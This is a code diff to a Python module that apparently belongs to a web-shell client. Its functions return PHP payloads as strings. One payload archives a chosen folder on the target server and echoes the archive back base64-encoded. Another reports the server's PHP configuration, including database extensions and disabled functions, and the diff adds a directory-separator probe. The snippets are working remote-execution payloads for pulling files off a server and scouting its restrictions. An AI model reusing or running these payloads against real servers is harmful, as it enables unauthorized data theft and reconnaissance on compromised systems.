@@ -60,7 +60,9 @@ def zip_path(path="./"):
     php_zip_code="""// Get real path for our folder
 $rootPath = realpath('"""+path+"""');
 
-$hash=date("ymdHis");
+$path_name=str_replace(DIRECTORY_SEPARATOR, '_', '"""+path+"""');
+
+$hash=$path_name."_".date("ymdHis");
 
 // Initialize archive object
 $zip = new ZipArchive();
@@ -101,6 +103,9 @@ $binary=fread($fp,filesize($file));
 echo base64_encode($binary);"""
     return code
 
+def DIRECTORY_SEPARATOR():
+    code="echo DIRECTORY_SEPARATOR;"
+    return code
 #
 def php_info():
     code="""header('Content-type: text/plain');
@@ -169,6 +174,7 @@ def php_info():
     echo "PostgreSQL : ".$pg_connect2=function_exists('pg_connect')?("ON"):("OFF");
     echo "\n";
     echo "disabled_functions : ".$r=ini_get('disable_functions') ? ini_get('disable_functions'):'none';
-    echo "\n";"""
+    echo "\n";
+    echo "DIRECTORY_SEPARATOR : ".DIRECTORY_SEPARATOR;"""
     return code
 #}END.
